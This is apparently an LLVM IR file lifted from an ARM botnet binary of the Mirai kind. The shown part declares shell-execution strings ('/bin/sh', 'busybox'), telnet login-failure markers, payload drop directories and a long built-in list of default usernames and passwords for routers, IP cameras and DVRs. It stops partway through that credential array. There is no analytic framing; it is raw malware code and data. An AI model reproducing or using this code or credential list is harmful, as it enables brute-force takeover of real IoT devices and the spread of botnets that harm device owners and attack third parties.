source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.3 = constant i32 -352321502
@global_var_230f4.7 = global i32 0
@global_var_23104.8 = global i32* @global_var_230f4.7
@global_var_23b10.15 = global i32 0
@global_var_230f8.18 = global i32 0
@global_var_e628.22 = constant i32 -509558771
@global_var_23b48.25 = global i32 0
@global_var_23b4c.26 = local_unnamed_addr global i32 0
@global_var_23b50.27 = local_unnamed_addr global i32 0
@global_var_237a4.30 = local_unnamed_addr global i32 4095
@global_var_237a0.33 = global i32 362436
@global_var_19020.35 = constant [7 x i8] c"(null)\00"
@global_var_27b48.37 = local_unnamed_addr global i32 0
@global_var_19028.39 = constant [8 x i8] c"/bin/sh\00"
@global_var_19030.41 = constant [3 x i8] c"sh\00"
@global_var_19034.43 = constant [3 x i8] c"-c\00"
@global_var_ff00.45 = constant i32 436207626
@global_var_19038.47 = constant i32 -1
@global_var_23b28.49 = global i32 0
@global_var_19438.51 = constant [5 x i8] c"PING\00"
@global_var_19010.53 = constant [8 x i8] c"busybox\00"
@global_var_19018.54 = constant i32 36
@global_var_1901c.55 = constant i32 35
@global_var_23764.56 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19010.53, i32 0, i32 0), i8* bitcast (i32* @global_var_19018.54 to i8*), i8* bitcast (i32* @global_var_1901c.55 to i8*)]
@global_var_18fd8.58 = constant [7 x i8] c"nvalid\00"
@global_var_18fe0.59 = constant [6 x i8] c"ailed\00"
@global_var_18fe8.60 = constant [9 x i8] c"ncorrect\00"
@global_var_18ff4.61 = constant [6 x i8] c"enied\00"
@global_var_18ffc.62 = constant [5 x i8] c"rror\00"
@global_var_19004.63 = constant [7 x i8] c"oodbye\00"
@global_var_1900c.64 = constant [4 x i8] c"bad\00"
@global_var_23744.65 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18fd8.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18fe0.59, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18fe8.60, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18ff4.61, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18ffc.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19004.63, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1900c.64, i32 0, i32 0)]
@global_var_23b30.67 = global i32 0
@global_var_23b34.68 = local_unnamed_addr global i32 0
@global_var_29db4.70 = global i32 0
@global_var_19440.72 = constant [6 x i8] c":>%$#\00"
@global_var_19448.79 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_29da8.81 = global i32 0
@global_var_18f5c.83 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_18f6c.84 = constant [6 x i8] c"/tmp/\00"
@global_var_18f74.85 = constant [6 x i8] c"/var/\00"
@global_var_18f7c.86 = constant [6 x i8] c"/dev/\00"
@global_var_18f84.87 = constant [10 x i8] c"/var/run/\00"
@global_var_18f90.88 = constant [10 x i8] c"/dev/shm/\00"
@global_var_18f9c.89 = constant [6 x i8] c"/mnt/\00"
@global_var_18fa4.90 = constant [7 x i8] c"/boot/\00"
@global_var_18fac.91 = constant [6 x i8] c"/usr/\00"
@global_var_18fb4.92 = constant [6 x i8] c"/opt/\00"
@global_var_23704.93 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_18f5c.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f6c.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f74.85, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f7c.86, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18f84.87, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18f90.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f9c.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18fa4.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18fac.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18fb4.92, i32 0, i32 0)]
@global_var_23730 = external global i32
@global_var_18444.100 = constant [7 x i8] c"telnet\00"
@global_var_1844c.101 = constant [5 x i8] c"root\00"
@global_var_18454.102 = constant [8 x i8] c"default\00"
@global_var_18460.103 = constant [7 x i8] c"daemon\00"
@global_var_18468.104 = constant [8 x i8] c"support\00"
@global_var_18474.105 = constant i32 0
@global_var_18478.106 = constant [7 x i8] c"123456\00"
@global_var_18480.107 = constant [7 x i8] c"Zte521\00"
@global_var_18488.108 = constant [6 x i8] c"vizxv\00"
@global_var_18490.109 = constant [8 x i8] c"support\00"
@global_var_184a0.110 = constant [6 x i8] c"admin\00"
@global_var_184a8.111 = constant [7 x i8] c"camera\00"
@global_var_184b0.112 = constant [5 x i8] c"1234\00"
@global_var_184b8.113 = constant [10 x i8] c"fliradmin\00"
@global_var_184c4.114 = constant [4 x i8] c"jvc\00"
@global_var_184cc.115 = constant [8 x i8] c"meinsma\00"
@global_var_184d8.116 = constant [9 x i8] c"password\00"
@global_var_184e4.117 = constant [11 x i8] c"supervisor\00"
@global_var_184f0.118 = constant [9 x i8] c"backdoor\00"
@global_var_184fc.119 = constant [7 x i8] c"atc123\00"
@global_var_18504.120 = constant [7 x i8] c"ascend\00"
@global_var_1850c.121 = constant [11 x i8] c"epicrouter\00"
@global_var_18518.122 = constant [5 x i8] c"none\00"
@global_var_18520.123 = constant [9 x i8] c"1234User\00"
@global_var_1852c.124 = constant [12 x i8] c"5678Service\00"
@global_var_1853c.125 = constant [9 x i8] c"atlantis\00"
@global_var_18548.126 = constant [8 x i8] c"ROOT500\00"
@global_var_18554.127 = constant [7 x i8] c"xxyyzz\00"
@global_var_1855c.128 = constant [7 x i8] c"danger\00"
@global_var_18564.129 = constant [7 x i8] c"crftpw\00"
@global_var_1856c.130 = constant [7 x i8] c"cms500\00"
@global_var_18574.131 = constant [15 x i8] c"ggdaseuaimhrke\00"
@global_var_18584.132 = constant [8 x i8] c"tslinux\00"
@global_var_18590.133 = constant [5 x i8] c"pass\00"
@global_var_18598.134 = constant [7 x i8] c"NetICs\00"
@global_var_185a0.135 = constant [9 x i8] c"security\00"
@global_var_185ac.136 = constant [7 x i8] c"friend\00"
@global_var_185b4.137 = constant [8 x i8] c"manager\00"
@global_var_185c0.138 = constant [7 x i8] c"bintec\00"
@global_var_185c8.139 = constant [8 x i8] c"articon\00"
@global_var_185d4.140 = constant [7 x i8] c"patrol\00"
@global_var_185dc.141 = constant [8 x i8] c"service\00"
@global_var_185e8.142 = constant [5 x i8] c"tech\00"
@global_var_185f0.143 = constant [5 x i8] c"live\00"
@global_var_185f8.144 = constant [7 x i8] c"Master\00"
@global_var_18600.145 = constant [7 x i8] c"laflaf\00"
@global_var_18608.146 = constant [9 x i8] c"Helpdesk\00"
@global_var_18614.147 = constant [6 x i8] c"Super\00"
@global_var_1861c.148 = constant [10 x i8] c"installer\00"
@global_var_18628.149 = constant [9 x i8] c"fivranne\00"
@global_var_18634.150 = constant [9 x i8] c"webadmin\00"
@global_var_18640.151 = constant [9 x i8] c"Serv4EMC\00"
@global_var_1864c.152 = constant [7 x i8] c"access\00"
@global_var_18654.153 = constant [9 x i8] c"netadmin\00"
@global_var_18660.154 = constant [9 x i8] c"mediator\00"
@global_var_1866c.155 = constant [8 x i8] c"Mau'dib\00"
@global_var_18678.156 = constant [7 x i8] c"cellit\00"
@global_var_18680.157 = constant [8 x i8] c"diamond\00"
@global_var_1868c.158 = constant [10 x i8] c"1234admin\00"
@global_var_18698.159 = constant [9 x i8] c"changeme\00"
@global_var_186a4.160 = constant [7 x i8] c"attack\00"
@global_var_186ac.161 = constant [7 x i8] c"cmaker\00"
@global_var_186b4.162 = constant [18 x i8] c"changeme2database\00"
@global_var_186c8.163 = constant [5 x i8] c"NULL\00"
@global_var_186d0.164 = constant [6 x i8] c"Cisco\00"
@global_var_186d8.165 = constant [6 x i8] c"cisco\00"
@global_var_186e0.166 = constant [8 x i8] c"blender\00"
@global_var_186ec.167 = constant [7 x i8] c"hsasdb\00"
@global_var_186f4.168 = constant [7 x i8] c"wlsedb\00"
@global_var_186fc.169 = constant [13 x i8] c"wlsepassword\00"
@global_var_1870c.170 = constant [7 x i8] c"system\00"
@global_var_18714.171 = constant [8 x i8] c"cgadmin\00"
@global_var_18720.172 = constant [5 x i8] c"surt\00"
@global_var_18728.173 = constant [5 x i8] c"tini\00"
@global_var_18730.174 = constant [5 x i8] c"any@\00"
@global_var_18738.175 = constant [6 x i8] c"davox\00"
@global_var_18740.176 = constant [7 x i8] c"calvin\00"
@global_var_18748.177 = constant [10 x i8] c"my_DEMARC\00"
@global_var_18754.178 = constant [8 x i8] c"MServer\00"
@global_var_18760.179 = constant [4 x i8] c"PBX\00"
@global_var_18768.180 = constant [8 x i8] c"NETWORK\00"
@global_var_18774.181 = constant [7 x i8] c"BRIDGE\00"
@global_var_1877c.182 = constant [14 x i8] c"michaelangelo\00"
@global_var_1878c.183 = constant [13 x i8] c"wrgg15_di524\00"
@global_var_1879c.184 = constant [9 x i8] c"firmware\00"
@global_var_187a8.185 = constant [10 x i8] c"1234Admin\00"
@global_var_187b4.186 = constant [11 x i8] c"software01\00"
@global_var_187c0.187 = constant [15 x i8] c"Administration\00"
@global_var_187d0.188 = constant [8 x i8] c"su@psir\00"
@global_var_187dc.189 = constant [8 x i8] c"4getme2\00"
@global_var_187e8.190 = constant [9 x i8] c"tiger123\00"
@global_var_187f4.191 = constant [5 x i8] c"help\00"
@global_var_187fc.192 = constant [10 x i8] c"extendnet\00"
@global_var_18808.193 = constant [8 x i8] c"Exabyte\00"
@global_var_18814.194 = constant [9 x i8] c"Posterie\00"
@global_var_18820.195 = constant [8 x i8] c"!manage\00"
@global_var_1882c.196 = constant [7 x i8] c"radius\00"
@global_var_18834.197 = constant [9 x i8] c"nimdaten\00"
@global_var_18840.198 = constant [5 x i8] c"isee\00"
@global_var_18848.199 = constant [11 x i8] c"56789Admin\00"
@global_var_18854.200 = constant [11 x i8] c"specialist\00"
@global_var_18860.201 = constant [7 x i8] c"public\00"
@global_var_18868.202 = constant [7 x i8] c"secret\00"
@global_var_18870.203 = constant [7 x i8] c"abc123\00"
@global_var_18878.204 = constant [10 x i8] c"P@55w0rd!\00"
@global_var_18884.205 = constant [8 x i8] c"iDirect\00"
@global_var_18890.206 = constant [6 x i8] c"pilou\00"
@global_var_18898.207 = constant [6 x i8] c"setup\00"
@global_var_188a0.208 = constant [6 x i8] c"hello\00"
@global_var_188a8.209 = constant [9 x i8] c"adslroot\00"
@global_var_188b4.210 = constant [14 x i8] c"administrator\00"
@global_var_188c4.211 = constant [14 x i8] c"Administrator\00"
@global_var_188d4.212 = constant [7 x i8] c"0Admin\00"
@global_var_188dc.213 = constant [9 x i8] c"123Admin\00"
@global_var_188e8.214 = constant [12 x i8] c"123456Admin\00"
@global_var_188f8.215 = constant [14 x i8] c"123456special\00"
@global_var_18908.216 = constant [10 x i8] c"superuser\00"
@global_var_18914.217 = constant [8 x i8] c"admin00\00"
@global_var_18920.218 = constant [8 x i8] c"orion99\00"
@global_var_1892c.219 = constant [8 x i8] c"tivonpw\00"
@global_var_18938.220 = constant [7 x i8] c"Ascend\00"
@global_var_18940.221 = constant [6 x i8] c"super\00"
@global_var_18948.222 = constant [12 x i8] c"lucenttech1\00"
@global_var_18958.223 = constant [13 x i8] c"AitbISP4eCiG\00"
@global_var_18968.224 = constant [6 x i8] c"smile\00"
@global_var_18970.225 = constant [7 x i8] c"router\00"
@global_var_18978.226 = constant [9 x i8] c"motorola\00"
@global_var_18984.227 = constant [7 x i8] c"sysadm\00"
@global_var_1898c.228 = constant [7 x i8] c"NetVCR\00"
@global_var_18994.229 = constant [11 x i8] c"xdfk9874t3\00"
@global_var_189a0.230 = constant [5 x i8] c"4tas\00"
@global_var_189a8.231 = constant [6 x i8] c"maint\00"
@global_var_189b0.232 = constant [6 x i8] c"m1122\00"
@global_var_189b8.233 = constant [8 x i8] c"3ep5w2u\00"
@global_var_189c4.234 = constant [9 x i8] c"ntacdmax\00"
@global_var_189d0.235 = constant [9 x i8] c"PlsChgMe\00"
@global_var_189dc.236 = constant [8 x i8] c"private\00"
@global_var_189e8.237 = constant [14 x i8] c"smallbusiness\00"
@global_var_189f8.238 = constant [3 x i8] c"mu\00"
@global_var_189fc.239 = constant [14 x i8] c"microbusiness\00"
@global_var_18a0c.240 = constant [8 x i8] c"pfsense\00"
@global_var_18a18.241 = constant [8 x i8] c"hawk201\00"
@global_var_18a24.242 = constant [8 x i8] c"h179350\00"
@global_var_18a30.243 = constant [3 x i8] c"lp\00"
@global_var_18a34.244 = constant [8 x i8] c"radware\00"
@global_var_18a40.245 = constant [9 x i8] c"trancell\00"
@global_var_18a4c.246 = constant [10 x i8] c"Col2ogro2\00"
@global_var_18a58.247 = constant [9 x i8] c"p1nacate\00"
@global_var_18a64.248 = constant [7 x i8] c"col1ma\00"
@global_var_18a6c.249 = constant [10 x i8] c"d1scovery\00"
@global_var_18a78.250 = constant [6 x i8] c"w2402\00"
@global_var_18a80.251 = constant [6 x i8] c"Sharp\00"
@global_var_18a88.252 = constant [9 x i8] c"engineer\00"
@global_var_18a94.253 = constant [8 x i8] c"ganteng\00"
@global_var_18aa0.254 = constant [9 x i8] c"smcadmin\00"
@global_var_18aac.255 = constant [10 x i8] c"barricade\00"
@global_var_18ab8.256 = constant [10 x i8] c"highspeed\00"
@global_var_18ac4.257 = constant [15 x i8] c"w0rkplac3rul3s\00"
@global_var_18ad4.258 = constant [11 x i8] c"stratauser\00"
@global_var_18ae0.259 = constant [6 x i8] c"Admin\00"
@global_var_18ae8.260 = constant [8 x i8] c"mysweex\00"
@global_var_18af4.261 = constant [7 x i8] c"symbol\00"
@global_var_18afc.262 = constant [8 x i8] c"mercury\00"
@global_var_18b08.263 = constant [9 x i8] c"truetime\00"
@global_var_18b14.264 = constant [11 x i8] c"12345Admin\00"
@global_var_18b20.265 = constant [7 x i8] c"master\00"
@global_var_18b28.266 = constant [5 x i8] c"xbox\00"
@global_var_18b30.267 = constant [10 x i8] c"tellabs#1\00"
@global_var_18b3c.268 = constant [8 x i8] c"admin_1\00"
@global_var_18b48.269 = constant [7 x i8] c"talent\00"
@global_var_18b50.270 = constant [8 x i8] c"imss7.0\00"
@global_var_18b5c.271 = constant [8 x i8] c"detmond\00"
@global_var_18b68.272 = constant [10 x i8] c"1111Admin\00"
@global_var_18b74.273 = constant [11 x i8] c"22222Admin\00"
@global_var_18b80.274 = constant [8 x i8] c"x-admin\00"
@global_var_18b8c.275 = constant [7 x i8] c"switch\00"
@global_var_18b94.276 = constant [9 x i8] c"zoomadsl\00"
@global_var_18ba0.277 = constant [9 x i8] c"expert03\00"
@global_var_18bac.278 = constant [5 x i8] c"anko\00"
@global_var_18bb4.279 = constant [11 x i8] c"oelinux123\00"
@global_var_18bc0.280 = constant [7 x i8] c"alpine\00"
@global_var_18bc8.281 = constant [8 x i8] c"maxided\00"
@global_var_18bd4.282 = constant [10 x i8] c"raspberry\00"
@global_var_18be0.283 = constant [8 x i8] c"vagrant\00"
@global_var_18bec.284 = constant [6 x i8] c"zlxx.\00"
@global_var_18bf4.285 = constant [9 x i8] c"juantech\00"
@global_var_18c00.286 = constant [7 x i8] c"avtech\00"
@global_var_18c08.287 = constant [7 x i8] c"xc3511\00"
@global_var_18c10.288 = constant [7 x i8] c"666666\00"
@global_var_18c18.289 = constant [7 x i8] c"888888\00"
@global_var_18c20.290 = constant [7 x i8] c"111111\00"
@global_var_18c28.291 = constant [9 x i8] c"bayandsl\00"
@global_var_18c34.292 = constant [12 x i8] c"12345676890\00"
@global_var_18c44.293 = constant [11 x i8] c"1234567890\00"
@global_var_18c50.294 = constant [13 x i8] c"admintelecom\00"
@global_var_18c60.295 = constant [13 x i8] c"telecomadmin\00"
@global_var_18c70.296 = constant [7 x i8] c"comcom\00"
@global_var_18c78.297 = constant [8 x i8] c"zte9x15\00"
@global_var_18c84.298 = constant [6 x i8] c"ZXDSL\00"
@global_var_18c8c.299 = constant [7 x i8] c"D-Link\00"
@global_var_18c94.300 = constant [6 x i8] c"dlink\00"
@global_var_18c9c.301 = constant [6 x i8] c"DLink\00"
@global_var_18ca4.302 = constant [12 x i8] c"asteriskftp\00"
@global_var_18cb4.303 = constant [9 x i8] c"dreambox\00"
@global_var_18cc0.304 = constant [5 x i8] c"1111\00"
@global_var_18cc8.305 = constant [6 x i8] c"12345\00"
@global_var_18cd0.306 = constant [6 x i8] c"54321\00"
@global_var_18cd8.307 = constant [7 x i8] c"fucker\00"
@global_var_18ce0.308 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_18cf0.309 = constant [13 x i8] c"7ujMko0vizxv\00"
@global_var_18d00.310 = constant [7 x i8] c"hi3518\00"
@global_var_18d08.311 = constant [7 x i8] c"klv123\00"
@global_var_18d10.312 = constant [8 x i8] c"klv1234\00"
@global_var_18d1c.313 = constant [8 x i8] c"realtek\00"
@global_var_18d28.314 = constant [6 x i8] c"jvbzd\00"
@global_var_18d30.315 = constant [8 x i8] c"xmhdipc\00"
@global_var_18d3c.316 = constant [9 x i8] c"openlgtv\00"
@global_var_18d48.317 = constant [8 x i8] c"root123\00"
@global_var_18d54.318 = constant [9 x i8] c"ahetzip8\00"
@global_var_18d60.319 = constant [7 x i8] c"696969\00"
@global_var_18d68.320 = constant [9 x i8] c"pa55w0rd\00"
@global_var_18d74.321 = constant [7 x i8] c"123123\00"
@global_var_18d7c.322 = constant [9 x i8] c"b120root\00"
@global_var_18d88.323 = constant [9 x i8] c"PASSWORD\00"
@global_var_18d94.324 = constant [6 x i8] c"ADMIN\00"
@global_var_18d9c.325 = constant [8 x i8] c"netgear\00"
@global_var_18da8.326 = constant [7 x i8] c"vyatta\00"
@global_var_18db0.327 = constant [7 x i8] c"atc456\00"
@global_var_18db8.328 = constant [7 x i8] c"micros\00"
@global_var_18dc0.329 = constant [8 x i8] c"comcast\00"
@global_var_18dcc.330 = constant [4 x i8] c"pos\00"
@global_var_18dd4.331 = constant [4 x i8] c"www\00"
@global_var_18ddc.332 = constant [5 x i8] c"2800\00"
@global_var_18de4.333 = constant [5 x i8] c"UBNT\00"
@global_var_18dec.334 = constant [9 x i8] c"00000000\00"
@global_var_18df8.335 = constant [5 x i8] c"user\00"
@global_var_18e00.336 = constant [5 x i8] c"ikwb\00"
@global_var_18e08.337 = constant [5 x i8] c"ubnt\00"
@global_var_18e10.338 = constant [4 x i8] c"buh\00"
@global_var_18e18.339 = constant [7 x i8] c"utstar\00"
@global_var_18e20.340 = constant [9 x i8] c"99999999\00"
@global_var_18e2c.341 = constant [6 x i8] c"Meins\00"
@global_var_18e34.342 = constant [4 x i8] c"JVC\00"
@global_var_18e3c.343 = constant [5 x i8] c"ip20\00"
@global_var_18e44.344 = constant [7 x i8] c"ip3000\00"
@global_var_18e4c.345 = constant [6 x i8] c"ip400\00"
@global_var_18e54.346 = constant [8 x i8] c"tsunami\00"
@global_var_18e60.347 = constant [7 x i8] c"2601hx\00"
@global_var_18e68.348 = constant [7 x i8] c"synnet\00"
@global_var_18e70.349 = constant [6 x i8] c"quser\00"
@global_var_18e78.350 = constant [8 x i8] c"Manager\00"
@global_var_18e84.351 = constant [8 x i8] c"netopia\00"
@global_var_18e90.352 = constant [8 x i8] c"anicust\00"
@global_var_18e9c.353 = constant [10 x i8] c"d.e.b.u.g\00"
@global_var_18ea8.354 = constant [5 x i8] c"echo\00"
@global_var_18eb0.355 = constant [5 x i8] c"demo\00"
@global_var_18eb8.356 = constant [7 x i8] c"client\00"
@global_var_18ec0.357 = constant [6 x i8] c"CISCO\00"
@global_var_18ec8.358 = constant [8 x i8] c"7654321\00"
@global_var_18ed4.359 = constant [9 x i8] c"adsl1234\00"
@global_var_18ee0.360 = constant [5 x i8] c"toor\00"
@global_var_18ee8.361 = constant [9 x i8] c"adminttd\00"
@global_var_18ef4.362 = constant [9 x i8] c"PlcmSpIp\00"
@global_var_18f00.363 = constant [9 x i8] c"11111111\00"
@global_var_18f0c.364 = constant [9 x i8] c"22222222\00"
@global_var_18f18.365 = constant [9 x i8] c"mountsys\00"
@global_var_18f24.366 = constant [14 x i8] c"LSiuY7pOmZG2s\00"
@global_var_18f34.367 = constant [15 x i8] c"3UJUh2VemEfUte\00"
@global_var_18f44.368 = constant [11 x i8] c"Muse!Admin\00"
@global_var_18f50.369 = constant [10 x i8] c"changeme2\00"
@global_var_231a4.370 = global [343 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18444.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1844c.101, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1844c.101, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1844c.101, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1844c.101, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1844c.101, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18454.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18460.103, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18468.104, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18444.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1844c.101, i32 0, i32 0), i8* bitcast (i32* @global_var_18474.105 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18478.106, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18480.107, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18488.108, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18454.102, i32 0, i32 0), i8* bitcast (i32* @global_var_18474.105 to i8*), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18490.109, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_184a0.110, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_184a8.111, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_184b0.112, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_184b8.113, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_184c4.114, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_184cc.115, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_184e4.117, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184f0.118, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_184fc.119, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_184a0.110, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18504.120, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1850c.121, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18518.122, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18520.123, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1852c.124, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1853c.125, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18548.126, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18554.127, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1855c.128, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18564.129, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1856c.130, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_18574.131, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_18574.131, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18584.132, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18590.133, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18598.134, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_185a0.135, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_185ac.136, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_185b4.137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_185c0.138, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_185c8.139, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_185d4.140, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_185dc.141, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_185e8.142, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_185f0.143, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_185f8.144, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18600.145, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18608.146, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18614.147, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1861c.148, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18628.149, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18634.150, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18640.151, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1864c.152, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18654.153, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18660.154, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1866c.155, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18678.156, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18680.157, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1868c.158, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18698.159, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_186a4.160, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_186ac.161, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18698.159, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_186b4.162, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_186c8.163, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_186a4.160, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18454.102, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_186d0.164, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_186d8.165, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_186e0.166, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x 